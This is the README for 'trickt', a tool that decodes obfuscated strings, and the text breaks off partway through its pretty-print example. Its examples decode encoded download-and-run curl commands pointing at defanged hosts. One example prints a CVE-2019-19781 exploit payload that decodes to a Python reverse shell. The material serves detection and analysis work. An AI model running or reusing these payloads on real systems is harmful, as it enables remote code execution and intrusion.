# trickt
Finds and converts obfuscated strings into a human readable form.

## Install

```bash
$ pip3 install trickt
```

## Run

### Searching individual strings

I refer to obfuscation as trickiness because I'm a child at heart.

`trickt` outputs strings as byte strings so you can see if there are goofy characters visually.

You can pass a file path to read and decode or decode a string directly.

**Base64**

- By default, this only matches base64 strings that are at least 32 characters in length (not including padding). This
is an effort to keep noise down.
- You can change via the API directly or you can use the `-m` switch.
```bash

$ trickt 'Y3VybCBoeHhwczovL3Bhc3RlYmluLmNvbS9yYXcvYmFzZTY0X2VuY29kZWQgPiBiYWRfZmlsZS5zaCAmJiAuL2JhZF9maWxlLnNoCg=='

Searching string for trickiness...

line 1::original:>  b'Y3VybCBoeHhwczovL3Bhc3RlYmluLmNvbS9yYXcvYmFzZTY0X2VuY29kZWQgPiBiYWRfZmlsZS5zaCAmJiAuL2JhZF9maWxlLnNoCg=='
    |
    |--decoded_base64>  b'curl hxxps://pastebin.com/raw/base64_encoded > bad_file.sh && ./bad_file.sh'
```

**Code points**
```bash
$ trickt 'chr(99) . chr(117) . chr(114) . chr(108) . chr(32) . chr(104) . chr(120) . chr(120) . chr(112) . chr(115) . chr(58) . chr(47) . chr(47) . chr(112) . chr(97) . chr(115) . chr(116) . chr(101) . chr(98) . chr(105) . chr(110) . chr(46) . chr(99) . chr(111) . chr(109) . chr(47) . chr(114) . chr(97) . chr(119) . chr(47) . chr(99) . chr(111) . chr(100) . chr(101) . chr(95) . chr(112) . chr(111) . chr(105) . chr(110) . chr(116) . chr(115) . chr(32) . chr(62) . chr(32) . chr(98) . chr(97) . chr(100) . chr(95) . chr(102) . chr(105) . chr(108) . chr(101) . chr(46) . chr(115) . chr(104) . chr(32) . chr(38) . chr(38) . chr(32) . chr(46) . chr(47) . chr(98) . chr(97) . chr(100) . chr(95) . chr(102) . chr(105) . chr(108) . chr(101) . chr(46) . chr(115) . chr(104)'

Searching string for trickiness...

line 1::original:>  b'chr(99) . chr(117) . chr(114) . chr(108) . chr(32) . chr(104) . chr(120) . chr(120) . chr(112) . chr(115) . chr(58) . chr(47) . chr(47) . chr(112) . chr(97) . chr(115) . chr(116) . chr(101) . chr(98) . chr(105) . chr(110) . chr(46) . chr(99) . chr(111) . chr(109) . chr(47) . chr(114) . chr(97) . chr(119) . chr(47) . chr(99) . chr(111) . chr(100) . chr(101) . chr(95) . chr(112) . chr(111) . chr(105) . chr(110) . chr(116) . chr(115) . chr(32) . chr(62) . chr(32) . chr(98) . chr(97) . chr(100) . chr(95) . chr(102) . chr(105) . chr(108) . chr(101) . chr(46) . chr(115) . chr(104) . chr(32) . chr(38) . chr(38) . chr(32) . chr(46) . chr(47) . chr(98) . chr(97) . chr(100) . chr(95) . chr(102) . chr(105) . chr(108) . chr(101) . chr(46) . chr(115) . chr(104)'
    |
    |--decoded_code_point>  b'curl hxxps://pastebin.com/raw/code_points > bad_file.sh && ./bad_file.sh'
```

**Escaped unicode**

```bash
$ trickt '\u0063\u0075\u0072\u006c\u0020\u0068\u0078\u0078\u0070\u0073\u003a\u002f\u002f\u0070\u0061\u0073\u0074\u0065\u0062\u0069\u006e\u002e\u0063\u006f\u006d\u002f\u0072\u0061\u0077\u002f\u0065\u0073\u0063\u0061\u0070\u0065\u0064\u005f\u0075\u006e\u0069\u0063\u006f\u0064\u0065\u0020\u003e\u0020\u0062\u0061\u0064\u005f\u0066\u0069\u006c\u0065\u002e\u0073\u0068\u0020\u0026\u0026\u0020\u002e\u002f\u0062\u0061\u0064\u005f\u0066\u0069\u006c\u0065\u002e\u0073\u0068'

Searching string for trickiness...

line 1::original:>  b'\\u0063\\u0075\\u0072\\u006c\\u0020\\u0068\\u0078\\u0078\\u0070\\u0073\\u003a\\u002f\\u002f\\u0070\\u0061\\u0073\\u0074\\u0065\\u0062\\u0069\\u006e\\u002e\\u0063\\u006f\\u006d\\u002f\\u0072\\u0061\\u0077\\u002f\\u0065\\u0073\\u0063\\u0061\\u0070\\u0065\\u0064\\u005f\\u0075\\u006e\\u0069\\u0063\\u006f\\u0064\\u0065\\u0020\\u003e\\u0020\\u0062\\u0061\\u0064\\u005f\\u0066\\u0069\\u006c\\u0065\\u002e\\u0073\\u0068\\u0020\\u0026\\u0026\\u0020\\u002e\\u002f\\u0062\\u0061\\u0064\\u005f\\u0066\\u0069\\u006c\\u0065\\u002e\\u0073\\u0068'
    |
    |--decoded_escaped_characters>  b'curl hxxps://pastebin.com/raw/escaped_unicode > bad_file.sh && ./bad_file.sh'
```
**Escaped hex**

```bash
$ trickt '\x63\x75\x72\x6C\x20\x68\x78\x78\x70\x73\x3A\x2F\x2F\x70\x61\x73\x74\x65\x62\x69\x6E\x2E\x63\x6F\x6D\x2F\x72\x61\x77\x2F\x65\x73\x63\x61\x70\x65\x64\x5F\x68\x65\x78\x20\x3E\x20\x62\x61\x64\x5F\x66\x69\x6C\x65\x2E\x73\x68\x20\x26\x26\x20\x2E\x2F\x62\x61\x64\x5F\x66\x69\x6C\x65\x2E\x73\x68'

Searching string for trickiness...

line 1::original:>  b'\\x63\\x75\\x72\\x6C\\x20\\x68\\x78\\x78\\x70\\x73\\x3A\\x2F\\x2F\\x70\\x61\\x73\\x74\\x65\\x62\\x69\\x6E\\x2E\\x63\\x6F\\x6D\\x2F\\x72\\x61\\x77\\x2F\\x65\\x73\\x63\\x61\\x70\\x65\\x64\\x5F\\x68\\x65\\x78\\x20\\x3E\\x20\\x62\\x61\\x64\\x5F\\x66\\x69\\x6C\\x65\\x2E\\x73\\x68\\x20\\x26\\x26\\x20\\x2E\\x2F\\x62\\x61\\x64\\x5F\\x66\\x69\\x6C\\x65\\x2E\\x73\\x68'
    |
    |--decoded_escaped_characters>  b'curl hxxps://pastebin.com/raw/escaped_hex > bad_file.sh && ./bad_file.sh'
```

**URL Encoding**
- `trickt` will attempt to decode URL encoding.
- This is a recipe for noise and false positives without boundaries in place. To compensate, `trickt` will not return a
 URL decoding result if there's nothing useful after decoding. It's just noise.

For example, let's look at an exploit attempt for CVE-2019-19781.

This example uses a sample packet capture from: 
https://dshield.org/forums/diary/Citrix+ADC+Exploits+are+Public+and+Heavily+Used+Attempts+to+Install+Backdoor/25700/

In one of HTTP streams, you find a URL Encoded payload that will decode to a script with code
points. If I pass the URL encoded payload to `trickt`:

```bash
$ trickt <a_long_url_encoded_string>

Searching string for trickiness...

line 1::original:>  url=127.0.0.1&title=%5B%25+template.new%28%7B%27BLOCK%27%3D%27print+readpipe%28chr%2847%29+.+chr%28118%29+.+chr%2897%29+.+chr%28114%29+.+chr%2847%29+.+chr%28112%29+.+chr%28121%29+.+chr%28116%29+.+chr%28104%29+.+chr%28111%29+.+chr%28110%29+.+chr%2847%29+.+chr%2898%29+.+chr%28105%29+.+chr%28110%29+.+chr%2847%29+.+chr%28112%29+.+chr%28121%29+.+chr%28116%29+.+chr%28104%29+.+chr%28111%29+.+chr%28110%29+.+chr%2832%29+.+chr%2845%29+.+chr%2899%29+.+chr%2832%29+.+chr%2839%29+.+chr%28105%29+.+chr%28109%29+.+chr%28112%29+.+chr%28111%29+.+chr%28114%29+.+chr%28116%29+.+chr%2832%29+.+chr%28115%29+.+chr%28111%29+.+chr%2899%29+.+chr%28107%29+.+chr%28101%29+.+chr%28116%29+.+chr%2844%29+.+chr%28115%29+.+chr%28117%29+.+chr%2898%29+.+chr%28112%29+.+chr%28114%29+.+chr%28111%29+.+chr%2899%29+.+chr%28101%29+.+chr%28115%29+.+chr%28115%29+.+chr%2844%29+.+chr%28111%29+.+chr%28115%29+.+chr%2859%29+.+chr%28115%29+.+chr%2861%29+.+chr%28115%29+.+chr%28111%29+.+chr%2899%29+.+chr%28107%29+.+chr%28101%29+.+chr%28116%29+.+chr%2846%29+.+chr%28115%29+.+chr%28111%29+.+chr%2899%29+.+chr%28107%29+.+chr%28101%29+.+chr%28116%29+.+chr%2840%29+.+chr%28115%29+.+chr%28111%29+.+chr%2899%29+.+chr%28107%29+.+chr%28101%29+.+chr%28116%29+.+chr%2846%29+.+chr%2865%29+.+chr%2870%29+.+chr%2895%29+.+chr%2873%29+.+chr%2878%29+.+chr%2869%29+.+chr%2884%29+.+chr%2844%29+.+chr%28115%29+.+chr%28111%29+.+chr%2899%29+.+chr%28107%29+.+chr%28101%29+.+chr%28116%29+.+chr%2846%29+.+chr%2883%29+.+chr%2879%29+.+chr%2867%29+.+chr%2875%29+.+chr%2895%29+.+chr%2883%29+.+chr%2884%29+.+chr%2882%29+.+chr%2869%29+.+chr%2865%29+.+chr%2877%29+.+chr%2841%29+.+chr%2859%29+.+chr%28115%29+.+chr%2846%29+.+chr%2899%29+.+chr%28111%29+.+chr%28110%29+.+chr%28110%29+.+chr%28101%29+.+chr%2899%29+.+chr%28116%29+.+chr%2840%29+.+chr%2840%29+.+chr%2834%29+.+chr%2849%29+.+chr%2855%29+.+chr%2850%29+.+chr%2846%29+.+chr%2849%29+.+chr%2854%29+.+chr%2846%29+.+chr%2850%29+.+chr%2857%29+.+chr%2846%29+.+chr%2849%29+.+chr%2834%29+.+chr%2844%29+.+chr%2849%29+.+chr%2850%29+.+chr%2851%29+.+chr%2852%29+.+chr%2853%29+.+chr%2841%29+.+chr%2841%29+.+chr%2859%29+.+chr%28111%29+.+chr%28115%29+.+chr%2846%29+.+chr%28100%29+.+chr%28117%29+.+chr%28112%29+.+chr%2850%29+.+chr%2840%29+.+chr%28115%29+.+chr%2846%29+.+chr%28102%29+.+chr%28105%29+.+chr%28108%29+.+chr%28101%29+.+chr%28110%29+.+chr%28111%29+.+chr%2840%29+.+chr%2841%29+.+chr%2844%29+.+chr%2848%29+.+chr%2841%29+.+chr%2859%29+.+chr%2832%29+.+chr%28111%29+.+chr%28115%29+.+chr%2846%29+.+chr%28100%29+.+chr%28117%29+.+chr%28112%29+.+chr%2850%29+.+chr%2840%29+.+chr%28115%29+.+chr%2846%29+.+chr%28102%29+.+chr%28105%29+.+chr%28108%29+.+chr%28101%29+.+chr%28110%29+.+chr%28111%29+.+chr%2840%29+.+chr%2841%29+.+chr%2844%29+.+chr%2849%29+.+chr%2841%29+.+chr%2859%29+.+chr%2832%29+.+chr%28111%29+.+chr%28115%29+.+chr%2846%29+.+chr%28100%29+.+chr%28117%29+.+chr%28112%29+.+chr%2850%29+.+chr%2840%29+.+chr%28115%29+.+chr%2846%29+.+chr%28102%29+.+chr%28105%29+.+chr%28108%29+.+chr%28101%29+.+chr%28110%29+.+chr%28111%29+.+chr%2840%29+.+chr%2841%29+.+chr%2844%29+.+chr%2850%29+.+chr%2841%29+.+chr%2859%29+.+chr%28112%29+.+chr%2861%29+.+chr%28115%29+.+chr%28117%29+.+chr%2898%29+.+chr%28112%29+.+chr%28114%29+.+chr%28111%29+.+chr%2899%29+.+chr%28101%29+.+chr%28115%29+.+chr%28115%29+.+chr%2846%29+.+chr%2899%29+.+chr%2897%29+.+chr%28108%29+.+chr%28108%29+.+chr%2840%29+.+chr%2891%29+.+chr%2834%29+.+chr%2847%29+.+chr%2898%29+.+chr%28105%29+.+chr%28110%29+.+chr%2847%29+.+chr%28115%29+.+chr%28104%29+.+chr%2834%29+.+chr%2844%29+.+chr%2834%29+.+chr%2845%29+.+chr%28105%29+.+chr%2834%29+.+chr%2893%29+.+chr%2841%29+.+chr%2859%29+.+chr%2839%29%29%27%7D%29%25%5D&desc=desc&UI_inuse=a
    |
    |--decoded_url_encoded>  url=127.0.0.1&title=[%+template.new({'BLOCK'='print+readpipe(chr(47)+.+chr(118)+.+chr(97)+.+chr(114)+.+chr(47)+.+chr(112)+.+chr(121)+.+chr(116)+.+chr(104)+.+chr(111)+.+chr(110)+.+chr(47)+.+chr(98)+.+chr(105)+.+chr(110)+.+chr(47)+.+chr(112)+.+chr(121)+.+chr(116)+.+chr(104)+.+chr(111)+.+chr(110)+.+chr(32)+.+chr(45)+.+chr(99)+.+chr(32)+.+chr(39)+.+chr(105)+.+chr(109)+.+chr(112)+.+chr(111)+.+chr(114)+.+chr(116)+.+chr(32)+.+chr(115)+.+chr(111)+.+chr(99)+.+chr(107)+.+chr(101)+.+chr(116)+.+chr(44)+.+chr(115)+.+chr(117)+.+chr(98)+.+chr(112)+.+chr(114)+.+chr(111)+.+chr(99)+.+chr(101)+.+chr(115)+.+chr(115)+.+chr(44)+.+chr(111)+.+chr(115)+.+chr(59)+.+chr(115)+.+chr(61)+.+chr(115)+.+chr(111)+.+chr(99)+.+chr(107)+.+chr(101)+.+chr(116)+.+chr(46)+.+chr(115)+.+chr(111)+.+chr(99)+.+chr(107)+.+chr(101)+.+chr(116)+.+chr(40)+.+chr(115)+.+chr(111)+.+chr(99)+.+chr(107)+.+chr(101)+.+chr(116)+.+chr(46)+.+chr(65)+.+chr(70)+.+chr(95)+.+chr(73)+.+chr(78)+.+chr(69)+.+chr(84)+.+chr(44)+.+chr(115)+.+chr(111)+.+chr(99)+.+chr(107)+.+chr(101)+.+chr(116)+.+chr(46)+.+chr(83)+.+chr(79)+.+chr(67)+.+chr(75)+.+chr(95)+.+chr(83)+.+chr(84)+.+chr(82)+.+chr(69)+.+chr(65)+.+chr(77)+.+chr(41)+.+chr(59)+.+chr(115)+.+chr(46)+.+chr(99)+.+chr(111)+.+chr(110)+.+chr(110)+.+chr(101)+.+chr(99)+.+chr(116)+.+chr(40)+.+chr(40)+.+chr(34)+.+chr(49)+.+chr(55)+.+chr(50)+.+chr(46)+.+chr(49)+.+chr(54)+.+chr(46)+.+chr(50)+.+chr(57)+.+chr(46)+.+chr(49)+.+chr(34)+.+chr(44)+.+chr(49)+.+chr(50)+.+chr(51)+.+chr(52)+.+chr(53)+.+chr(41)+.+chr(41)+.+chr(59)+.+chr(111)+.+chr(115)+.+chr(46)+.+chr(100)+.+chr(117)+.+chr(112)+.+chr(50)+.+chr(40)+.+chr(115)+.+chr(46)+.+chr(102)+.+chr(105)+.+chr(108)+.+chr(101)+.+chr(110)+.+chr(111)+.+chr(40)+.+chr(41)+.+chr(44)+.+chr(48)+.+chr(41)+.+chr(59)+.+chr(32)+.+chr(111)+.+chr(115)+.+chr(46)+.+chr(100)+.+chr(117)+.+chr(112)+.+chr(50)+.+chr(40)+.+chr(115)+.+chr(46)+.+chr(102)+.+chr(105)+.+chr(108)+.+chr(101)+.+chr(110)+.+chr(111)+.+chr(40)+.+chr(41)+.+chr(44)+.+chr(49)+.+chr(41)+.+chr(59)+.+chr(32)+.+chr(111)+.+chr(115)+.+chr(46)+.+chr(100)+.+chr(117)+.+chr(112)+.+chr(50)+.+chr(40)+.+chr(115)+.+chr(46)+.+chr(102)+.+chr(105)+.+chr(108)+.+chr(101)+.+chr(110)+.+chr(111)+.+chr(40)+.+chr(41)+.+chr(44)+.+chr(50)+.+chr(41)+.+chr(59)+.+chr(112)+.+chr(61)+.+chr(115)+.+chr(117)+.+chr(98)+.+chr(112)+.+chr(114)+.+chr(111)+.+chr(99)+.+chr(101)+.+chr(115)+.+chr(115)+.+chr(46)+.+chr(99)+.+chr(97)+.+chr(108)+.+chr(108)+.+chr(40)+.+chr(91)+.+chr(34)+.+chr(47)+.+chr(98)+.+chr(105)+.+chr(110)+.+chr(47)+.+chr(115)+.+chr(104)+.+chr(34)+.+chr(44)+.+chr(34)+.+chr(45)+.+chr(105)+.+chr(34)+.+chr(93)+.+chr(41)+.+chr(59)+.+chr(39))'})%]&desc=desc&UI_inuse=a
        |
        |--decoded_code_point>  /var/python/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.29.1",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Now, let's pass in part of that URL encoded string that does not contain the code points. There are no results because
decoding the URL encoded string yields nothing interesting according to `trickt`.

```bash
$ trickt "url=127.0.0.1&title=%5B%25+template.new%28%7B%27BLOCK%27%3D%27print+readpipe%28"

Searching string for trickiness...
```

### Searching an entire file

```bash
$ cat my_bad_file.txt 
nothing on this line
XHg2M1x4NzVceDcyXHg2Q1x4MjBceDY4XHg3OFx4NzhceDcwXHg3M1x4M0FceDJGXHgyRlx4NzBceDYxXHg3M1x4NzRceDY1XHg2Mlx4NjlceDZFXHgyRVx4NjNceDZGXHg2RFx4MkZceDcyXHg2MVx4NzdceDJGXHg2NVx4NzNceDYzXHg2MVx4NzBceDY1XHg2NFx4NUZceDY4XHg2NVx4NzhceDVGXHg2RVx4NjVceDczXHg3NFx4NjVceDY0XHgyMFx4M0VceDIwXHg2Mlx4NjFceDY0XHg1Rlx4NjZceDY5XHg2Q1x4NjVceDJFXHg3M1x4NjhceDIwXHgyNlx4MjZceDIwXHgyRVx4MkZceDYyXHg2MVx4NjRceDVGXHg2Nlx4NjlceDZDXHg2NVx4MkVceDczXHg2OAo=
nothing on this line
nothing on this line
<element><element2>\u0063\u0075\u0072\u006c\u0020\u0068\u0078\u0078\u0070\u0073\u003a\u002f\u002f\u0070\u0061\u0073\u0074\u0065\u0062\u0069\u006e\u002e\u0063\u006f\u006d\u002f\u0072\u0061\u0077\u002f\u0065\u0073\u0063\u0061\u0070\u0065\u0064\u005f\u0075\u006e\u0069\u0063\u006f\u0064\u0065\u0020\u003e\u0020\u0062\u0061\u0064\u005f\u0066\u0069\u006c\u0065\u002e\u0073\u0068\u0020\u0026\u0026\u0020\u002e\u002f\u0062\u0061\u0064\u005f\u0066\u0069\u006c\u0065\u002e\u0073\u0068</element2></element>
nothing on this line
my_hex = '\x63\x75\x72\x6C\x20\x68\x78\x78\x70\x73\x3A\x2F\x2F' + '\x70\x61\x73\x74\x65\x62\x69\x6E\x2E\x63\x6F\x6D\x2F' + '\x72\x61\x77\x2F\x65\x73\x63\x61\x70\x65\x64\x5F\x68\x65\x78\x20\x3E\x20\x62\x61\x64\x5F\x66\x69\x6C\x65' + '\x2E\x73\x68\x20\x26\x26\x20\x2E\x2F\x62\x61\x64\x5F\x66\x69' + '\x6C\x65\x2E\x73\x68'
nothing on this line
oops, forgot my script here:  readpipe(chr(99) . chr(117) . chr(114) . chr(108) . chr(32) . chr(104) . chr(120) . chr(120) . chr(112) . chr(115) . chr(58) . chr(47) . chr(47) . chr(112) . chr(97) . chr(115) . chr(116) . chr(101) . chr(98) . chr(105) . chr(110) . chr(46) . chr(99) . chr(111) . chr(109) . chr(47) . chr(114) . chr(97) . chr(119) . chr(47) . chr(99) . chr(111) . chr(100) . chr(101) . chr(95) . chr(112) . chr(111) . chr(105) . chr(110) . chr(116) . chr(115) . chr(32) . chr(62) . chr(32) . chr(98) . chr(97) . chr(100) . chr(95) . chr(102) . chr(105) . chr(108) . chr(101) . chr(46) . chr(115) . chr(104) . chr(32) . chr(38) . chr(38) . chr(32) . chr(46) . chr(47) . chr(98) . chr(97) . chr(100) . chr(95) . chr(102) . chr(105) . chr(108) . chr(101) . chr(46) . chr(115) . chr(104)) which I hope you don't catch
nothing on this line
```
```bash
$ trickt my_bad_file.txt 

Searching file 'my_bad_file.txt' for trickiness...

line 2::original:>  b'XHg2M1x4NzVceDcyXHg2Q1x4MjBceDY4XHg3OFx4NzhceDcwXHg3M1x4M0FceDJGXHgyRlx4NzBceDYxXHg3M1x4NzRceDY1XHg2Mlx4NjlceDZFXHgyRVx4NjNceDZGXHg2RFx4MkZceDcyXHg2MVx4NzdceDJGXHg2NVx4NzNceDYzXHg2MVx4NzBceDY1XHg2NFx4NUZceDY4XHg2NVx4NzhceDVGXHg2RVx4NjVceDczXHg3NFx4NjVceDY0XHgyMFx4M0VceDIwXHg2Mlx4NjFceDY0XHg1Rlx4NjZceDY5XHg2Q1x4NjVceDJFXHg3M1x4NjhceDIwXHgyNlx4MjZceDIwXHgyRVx4MkZceDYyXHg2MVx4NjRceDVGXHg2Nlx4NjlceDZDXHg2NVx4MkVceDczXHg2OAo=\n'
    |
    |--decoded_base64>  b'\\x63\\x75\\x72\\x6C\\x20\\x68\\x78\\x78\\x70\\x73\\x3A\\x2F\\x2F\\x70\\x61\\x73\\x74\\x65\\x62\\x69\\x6E\\x2E\\x63\\x6F\\x6D\\x2F\\x72\\x61\\x77\\x2F\\x65\\x73\\x63\\x61\\x70\\x65\\x64\\x5F\\x68\\x65\\x78\\x5F\\x6E\\x65\\x73\\x74\\x65\\x64\\x20\\x3E\\x20\\x62\\x61\\x64\\x5F\\x66\\x69\\x6C\\x65\\x2E\\x73\\x68\\x20\\x26\\x26\\x20\\x2E\\x2F\\x62\\x61\\x64\\x5F\\x66\\x69\\x6C\\x65\\x2E\\x73\\x68'
        |
        |--decoded_escaped_characters>  b'curl hxxps://pastebin.com/raw/escaped_hex_nested > bad_file.sh && ./bad_file.sh'

line 5::original:>  b'<element><element2>\\u0063\\u0075\\u0072\\u006c\\u0020\\u0068\\u0078\\u0078\\u0070\\u0073\\u003a\\u002f\\u002f\\u0070\\u0061\\u0073\\u0074\\u0065\\u0062\\u0069\\u006e\\u002e\\u0063\\u006f\\u006d\\u002f\\u0072\\u0061\\u0077\\u002f\\u0065\\u0073\\u0063\\u0061\\u0070\\u0065\\u0064\\u005f\\u0075\\u006e\\u0069\\u0063\\u006f\\u0064\\u0065\\u0020\\u003e\\u0020\\u0062\\u0061\\u0064\\u005f\\u0066\\u0069\\u006c\\u0065\\u002e\\u0073\\u0068\\u0020\\u0026\\u0026\\u0020\\u002e\\u002f\\u0062\\u0061\\u0064\\u005f\\u0066\\u0069\\u006c\\u0065\\u002e\\u0073\\u0068</element2></element>\n'
    |
    |--decoded_escaped_characters>  b'curl hxxps://pastebin.com/raw/escaped_unicode > bad_file.sh && ./bad_file.sh'

line 5::original:>  b'<element><element2>\\u0063\\u0075\\u0072\\u006c\\u0020\\u0068\\u0078\\u0078\\u0070\\u0073\\u003a\\u002f\\u002f\\u0070\\u0061\\u0073\\u0074\\u0065\\u0062\\u0069\\u006e\\u002e\\u0063\\u006f\\u006d\\u002f\\u0072\\u0061\\u0077\\u002f\\u0065\\u0073\\u0063\\u0061\\u0070\\u0065\\u0064\\u005f\\u0075\\u006e\\u0069\\u0063\\u006f\\u0064\\u0065\\u0020\\u003e\\u0020\\u0062\\u0061\\u0064\\u005f\\u0066\\u0069\\u006c\\u0065\\u002e\\u0073\\u0068\\u0020\\u0026\\u0026\\u0020\\u002e\\u002f\\u0062\\u0061\\u0064\\u005f\\u0066\\u0069\\u006c\\u0065\\u002e\\u0073\\u0068</element2></element>\n'
    |
    |--decoded_base64>  b'\xbbM:\xde\xed4\xef\x9b\xb4\xd3\xbd\xae\xd3N\x9c\xbbM6\xd2\xed4\xeb\xcb\xb4\xd3\xbf.\xd3N\xfc\xbbM;\xd2\xed4\xef{\xb4\xd3v\xae\xd3M\x9f\xbbM6~\xed4\xefK\xb4\xd3\xadn\xd3N\xf7\xbbM;\xe2\xed4\xeb\x9b\xb4\xd3\xad\xae\xd3N\xbd\xbbM:z\xed4\xd9\xeb\xb4\xd3\xad\xee\xd3N\x9f\xbbM:v\xed4\xd9\xfb\xb4\xd3\xbd\xae\xd3N\xb5\xbbM;\xee\xed4\xd9\xfb\xb4\xd3\xaen\xd3N\xf7\xbbM:\xde\xed4\xeb[\xb4\xd3\xbd.\xd3N\xb9\xbbM:\xe2\xed4\xe5\xfb\xb4\xd3\xben\xd3N\x9e\xbbM:\xf6\xed4\xeb{\xb4\xd3\xa7\xee\xd3N\xb8\xbbM:\xe6\xed4\xdbK\xb4\xd3w\xae\xd3M\xb4\xbbM:\xda\xed4\xeb[\xb4\xd3\xae.\xd3N_\xbbM:\xea\xed4\xeb\xdb\xb4\xd3\xa7.\xd3N\xb9\xbbM6z\xed4\xef{\xb4\xd3\xaf.\xd3M\xb4\xbbM6\xea\xed4\xdb\xab\xb4\xd3m.\xd3M\x9e\xbbM6~\xed4\xebk\xb4\xd3\xadn\xd3N\xb8\xbbM9~\xed4\xeb\xab\xb4\xd3\xafn\xd3N\x9c\xbbM:\xe6\xed4\xd9\xeb\xb4\xd3\xbd\xee\xd3N\xbc'

line 7::original:>  b"my_hex = '\\x63\\x75\\x72\\x6C\\x20\\x68\\x78\\x78\\x70\\x73\\x3A\\x2F\\x2F' + '\\x70\\x61\\x73\\x74\\x65\\x62\\x69\\x6E\\x2E\\x63\\x6F\\x6D\\x2F' + '\\x72\\x61\\x77\\x2F\\x65\\x73\\x63\\x61\\x70\\x65\\x64\\x5F\\x68\\x65\\x78\\x20\\x3E\\x20\\x62\\x61\\x64\\x5F\\x66\\x69\\x6C\\x65' + '\\x2E\\x73\\x68\\x20\\x26\\x26\\x20\\x2E\\x2F\\x62\\x61\\x64\\x5F\\x66\\x69' + '\\x6C\\x65\\x2E\\x73\\x68'\n"
    |
    |--decoded_escaped_characters>  b'curl hxxps://pastebin.com/raw/escaped_hex > bad_file.sh && ./bad_file.sh'

line 9::original:>  b"oops, forgot my script here:  readpipe(chr(99) . chr(117) . chr(114) . chr(108) . chr(32) . chr(104) . chr(120) . chr(120) . chr(112) . chr(115) . chr(58) . chr(47) . chr(47) . chr(112) . chr(97) . chr(115) . chr(116) . chr(101) . chr(98) . chr(105) . chr(110) . chr(46) . chr(99) . chr(111) . chr(109) . chr(47) . chr(114) . chr(97) . chr(119) . chr(47) . chr(99) . chr(111) . chr(100) . chr(101) . chr(95) . chr(112) . chr(111) . chr(105) . chr(110) . chr(116) . chr(115) . chr(32) . chr(62) . chr(32) . chr(98) . chr(97) . chr(100) . chr(95) . chr(102) . chr(105) . chr(108) . chr(101) . chr(46) . chr(115) . chr(104) . chr(32) . chr(38) . chr(38) . chr(32) . chr(46) . chr(47) . chr(98) . chr(97) . chr(100) . chr(95) . chr(102) . chr(105) . chr(108) . chr(101) . chr(46) . chr(115) . chr(104)) which I hope you don't catch\n"
    |
    |--decoded_code_point>  b'curl hxxps://pastebin.com/raw/code_points > bad_file.sh && ./bad_file.sh'
```

### Pretty print

If you don't like looking at escaped new-line and tab characters, you can pretty print with the `-p` or `--pretty` switches.

Without `--pretty`:
```bash
$ trickt 'WwoJewoJCSJrZXkiOiAidmFsdWUgd2l0aCBubyB0cmlja2luZXNzIiwKCQkibmFpdmUtY29tbWFuZHMiOiBbCgkJCSJPeUJqZFhKc0lHaDRlSEJiT2wwdkwySmhaR2QxZVM1amIyMHZiV0ZzZWlBK0lISjFibTFsTG5Ob0lDWW1JR05vYlc5a0lDdDRJSEoxYm0xbExuTm9JQ1ltSUM0dmNuVnViV1V1YzJnN0NnPT0iLAoJCQkibHMgLWFsaCIKCQldLAoJCSJkdXJhdGlvbiI6IDM2MDAsCgkJImRpY3QiOiB7CgkJCSJpbm5lci1rZXkiOiAiaW5uZXItdmFsdWUiCgkJfQoJfQpdCg=='

Searching string for trickiness...

line 1::original:>  b'WwoJewoJCSJrZXkiOiAidmFsdWUgd2l0aCBubyB0cmlja2luZXNzIiwKCQkibmFpdmUtY29tbWFuZHMiOiBbCgkJCSJPeUJqZFhKc0lHaDRlSEJiT2wwdkwySmhaR2QxZVM1amIyMHZiV0ZzZWlBK0lISjFibTFsTG5Ob0lDWW1JR05vYlc5a0lDdDRJSEoxYm0xbExuTm9JQ1ltSUM0dmNuVnViV1V1YzJnN0NnPT0iLAoJCQkibHMgLWFsaCIKCQldLAoJCSJkdXJhdGlvbiI6IDM2MDAsCgkJImRpY3QiOiB7CgkJCSJpbm5lci1rZXkiOiAiaW5uZXItdmFsdWUiCgkJfQoJfQpdCg=='
    |
    |--decoded_base64>  b'[\n\t{\n\t\t"key": "value with no trickiness",\n\t\t"naive-commands": [\n\t\t\t"OyBjdXJsIGh4eHBbOl0vL2JhZGd1eS5jb20vbWFseiA+IHJ1bm1lLnNoICYmIGNobW9kICt4IHJ1bm1lLnNoICYmIC4vcnVubWUuc2g7Cg==",\n\t\t\t"ls -alh"\n\t\t],\n\t\t"duration": 3600,\n\t\t"dict": {\n\t\t\t"inner-key": "inner-value"\n\t\t}\n\t}\n]'
        |
        |--decoded_base64>  b'; curl hxxp[:]//badguy.com/malz > runme.sh && chmod +x runme.sh && ./runme.sh;'
```

With `--pretty`:
```bash
$ trickt --pretty 'WwoJewoJCSJrZXkiOiAidmFsdWUgd2l0aCBubyB0cmlja2luZXNzIiwKCQkibmFpdmUtY29tbWFuZHMiOiBbCgkJCSJPeUJqZFhKc0lHaDRlSEJiT2wwdkwySmhaR2QxZVM1amIyMHZiV0ZzZWlBK0lISjFibTFsTG5Ob0lDWW1JR05vYlc5a0lDdDRJSEoxYm0xbExuTm9JQ1ltSUM0dmNuVnViV1V1YzJnN0NnPT0iLAoJCQkibHMgLWFsaCIKCQldLAoJCSJkdXJhdGlvbiI6IDM2MDAsCgkJImRpY3QiOiB7CgkJCSJpbm5lci1rZXkiOiAiaW5uZXItdmFsdWUiCgkJfQoJfQpdCg=='

Searching string for trickiness...

line 1::original:>  WwoJewoJCSJrZXkiOiAidmFsdWUgd2l0aCBubyB0cmlja2luZXNzIiwKCQkibmFpdmUtY29tbWFuZHMiOiBbCgkJCSJPeUJqZFhKc0lHaDRlSEJiT2wwdkwySmhaR2QxZVM1amIyMHZiV0ZzZWlBK0lISjFibTFsTG5Ob0lDWW1JR05vYlc5a0lDdDRJSEoxYm0xbExuTm9JQ1ltSUM0dmNuVnViV1V1YzJnN0NnPT0iLAoJCQkibHMgLWFsaCIKCQldLAoJCSJkdXJhdGlvbiI6IDM2MDAsCgkJImRpY3QiOiB7CgkJCSJpbm5lci1rZXkiOiAiaW5uZXItdmFsdWUiCgkJfQoJfQpdCg==
    |
    |--decoded_base64>  [
        {
                "key": "value with no trickiness",
                "naive-commands": [
